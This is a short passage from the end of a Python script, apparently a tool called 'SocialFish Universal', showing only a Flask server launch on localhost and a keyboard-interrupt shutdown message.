    app.run(host="127.0.0.1", port=5000)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🐟 SocialFish Universal stopped by user")
        exit(0)
